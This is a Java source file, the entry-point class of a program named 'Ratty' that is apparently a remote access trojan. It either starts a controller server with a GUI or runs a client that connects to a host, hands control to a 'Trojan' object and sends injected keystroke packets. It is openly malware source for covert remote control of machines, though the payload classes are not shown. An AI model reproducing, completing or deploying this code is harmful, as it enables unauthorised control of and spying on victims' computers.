package de.sogomn.rat;

import java.awt.Color;
import java.awt.event.KeyEvent;

import javax.swing.UIDefaults;
import javax.swing.UIManager;
import javax.swing.plaf.nimbus.NimbusLookAndFeel;

import de.sogomn.rat.packet.KeyEventPacket;
import de.sogomn.rat.server.ActiveServer;
import de.sogomn.rat.server.gui.RattyGui;
import de.sogomn.rat.server.gui.ServerGuiController;


public final class Ratty {
	
	public static final boolean CLIENT = false;
	
	private Ratty() {
		//...
	}
	
	private static void setLookAndFeel() {
		final NimbusLookAndFeel nimbus = new NimbusLookAndFeel();
		final UIDefaults defaults = nimbus.getDefaults();
		
		defaults.put("control", Color.LIGHT_GRAY);
		defaults.put("nimbusBase", Color.LIGHT_GRAY);
		
		try {
			UIManager.setLookAndFeel(nimbus);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public static void connectToHost(final String address, final int port) {
		final ActiveClient newClient = new ActiveClient(address, port);
		final Trojan trojan = new Trojan();
		
		if (!newClient.isOpen()) {
			connectToHost(address, port);
			
			return;
		}
		
		newClient.setObserver(trojan);
		newClient.start();
		newClient.sendPacket(new KeyEventPacket(KeyEvent.VK_W, true));
		newClient.sendPacket(new KeyEventPacket(KeyEvent.VK_W, false));
	}
	
	public static void startServer(final int port) {
		final ActiveServer server = new ActiveServer(port);
		final RattyGui gui = new RattyGui();
		final ServerGuiController controller = new ServerGuiController();
		
		gui.setController(controller);
		
		server.setObserver(controller);
		server.start();
	}
	
	public static void main(final String[] args) {
		setLookAndFeel();
		
		if (CLIENT) {
			System.out.println("Starting client");
			
			connectToHost("localhost", 23456);
		} else {
			System.out.println("Starting server");
			
			startServer(23456);
		}
	}
	
}
